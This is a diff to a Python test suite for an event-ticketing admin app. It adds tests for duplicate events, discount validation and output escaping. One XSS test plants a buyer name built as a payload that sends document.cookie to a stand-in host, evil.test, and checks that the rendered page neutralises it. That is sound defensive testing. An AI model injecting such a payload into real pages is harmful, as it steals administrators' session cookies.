@@ -79,15 +79,47 @@ def test_admin_rejects_a_forged_session_cookie(dynamodb_tables):
     assert resp.status_code == 303
 
 
-def test_admin_can_create_event(admin_client):
-    resp = admin_client.post("/admin/events", data={
+def _create_event_form(**overrides):
+    data = {
         "year": "2027", "name": "Next Year Ball", "date": "2027-03-06",
         "location": "NOLA", "description": "d", "ticket_price_cents": "15000",
         "capacity": "300",
-    }, follow_redirects=False)
+    }
+    data.update(overrides)
+    return data
+
+
+def test_admin_can_create_event(admin_client):
+    resp = admin_client.post(
+        "/admin/events", data=_create_event_form(), follow_redirects=False
+    )
     assert resp.status_code == 303
     items = EVENTS().scan()["Items"]
     assert any(int(e["year"]) == 2027 for e in items)
+
+
+def test_creating_an_event_for_an_existing_year_is_refused(admin_client):
+    """A double-submit must not reset a live event's sales counters.
+
+    An unconditional put would zero tickets_sold_count and drop the event back
+    to draft while every paid order for it survives — capacity accounting
+    silently corrupted mid-sale.
+    """
+    _put_event("evt_2026", tickets_sold_count=42, status="open", registration_open=True)
+
+    resp = admin_client.post(
+        "/admin/events",
+        data=_create_event_form(year="2026", name="Oops Duplicate"),
+        follow_redirects=False,
+    )
+
+    assert resp.status_code == 409
+    assert "already exists" in resp.text
+
+    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
+    assert int(event["tickets_sold_count"]) == 42, "sales counter must survive"
+    assert event["status"] == "open", "a live event must not be knocked back to draft"
+    assert event["name"] == "Test", "the original event is untouched"
 
 
 def test_opening_an_event_closes_any_other_open_event(admin_client):
@@ -185,6 +217,36 @@ def test_refund_unknown_order_404s(admin_client):
     assert resp.status_code == 404
 
 
+def test_orders_page_never_puts_a_buyer_name_in_a_js_string(admin_client):
+    """buyer_name is public input rendered into an admin's authenticated page.
+
+    HTML-escaping is the WRONG escaping for a JS string inside an attribute:
+    the browser HTML-decodes the attribute before the JS parser runs, so
+    `&#39;` becomes `'` and the payload breaks out. The name must therefore
+    reach the script as data (a data-* attribute read via dataset), never as
+    part of a JS source string.
+    """
+    payload = "'); fetch('https://evil.test/'+document.cookie); ('"
+    _put_order("ord_xss", buyer_name=payload)
+
+    resp = admin_client.get("/admin/orders?event_id=evt_2026")
+    body = resp.text
+
+    assert resp.status_code == 200
+    # The quotes are what make this executable; they must never survive raw.
+    assert payload not in body
+    assert "');" not in body and "('" not in body
+    # No inline handler may carry an interpolated value at all.
+    assert "onsubmit=" not in body and "onclick=" not in body
+    # Nothing attacker-controlled may appear inside the <script> block.
+    script = body.split("<script>", 1)[1].split("</script>", 1)[0]
+    assert "evil.test" not in script
+    # It IS rendered — HTML-escaped, in an HTML context, where that escaping
+    # is the correct one.
+    assert "&#39;); fetch(&#39;https://evil.test/&#39;" in body
+    assert 'data-buyer-name="&#39;);' in body
+
+
 def test_orders_export_returns_csv(admin_client):
     _put_order("ord_csv", quantity=1, attendees=[{"name": "Jane"}], total_cents=15000)
     resp = admin_client.get("/admin/orders/export?event_id=evt_2026")
@@ -207,12 +269,59 @@ def test_orders_export_neutralizes_spreadsheet_formulas(admin_client):
     assert ",'=" in data_row  # Escaped formula marker
 
 
-def test_discount_code_is_stored_normalized(admin_client):
-    admin_client.post("/admin/discount-codes", data={
-        "code": " member20 ", "event_id": "evt_2026",
+def _create_code(admin_client, **overrides):
+    data = {
+        "code": "MEMBER20", "event_id": "evt_2026",
         "discount_type": "percent", "discount_value": "20", "max_uses": "",
-    }, follow_redirects=False)
+    }
+    data.update(overrides)
+    return admin_client.post("/admin/discount-codes", data=data, follow_redirects=False)
+
+
+def test_discount_code_is_stored_normalized(admin_client):
+    _create_code(admin_client, code=" member20 ")
     assert DISCOUNT_CODES().get_item(Key={"code": "MEMBER20"}).get("Item") is not None
+
+
+def test_discount_code_with_unknown_type_is_rejected(admin_client):
+    """Checkout reads codes back through a strict model.
+
+    An unrecognized discount_type written here would be a ValidationError — a
+    500 — for every customer who typed the code, long after the admin who made
+    the typo has gone home.
+    """
+    resp = _create_code(admin_client, code="BOGUS", discount_type="bogus")
+
+    assert resp.status_code == 400
+    assert "percent" in resp.text and "fixed" in resp.text
+    assert DISCOUNT_CODES().get_item(Key={"code": "BOGUS"}).get("Item") is None
+
+
+def test_percent_discount_over_100_is_rejected(admin_client):
+    """101% clamps the total to 0 via compute_total's floor — free tickets."""
+    resp = _create_code(admin_client, code="FREE", discount_type="percent",
+                        discount_value="150")
+
+    assert resp.status_code == 400
+    assert "between 0 and 100" in resp.text
+    assert DISCOUNT_CODES().get_item(Key={"code": "FREE"}).get("Item") is None
+
+
+def test_negative_discount_value_is_rejected(admin_client):
+    """A negative percent doesn't discount — it charges MORE than the subtotal."""
+    for discount_type in ("percent", "fixed"):
+        resp = _create_code(admin_client, code="SURCHARGE",
+                            discount_type=discount_type, discount_value="-50")
+        assert resp.status_code == 400, discount_type
+        assert DISCOUNT_CODES().get_item(Key={"code": "SURCHARGE"}).get("Item") is None
+
+
+def test_valid_fixed_discount_is_accepted(admin_client):
+    resp = _create_code(admin_client, code="TENOFF", discount_type="fixed",
+                        discount_value="1000")
+    assert resp.status_code == 303
+    code = DISCOUNT_CODES().get_item(Key={"code": "TENOFF"})["Item"]
+    assert int(code["discount_value"]) == 1000
 
 
 def test_waitlist_notify_marks_entry(admin_client):
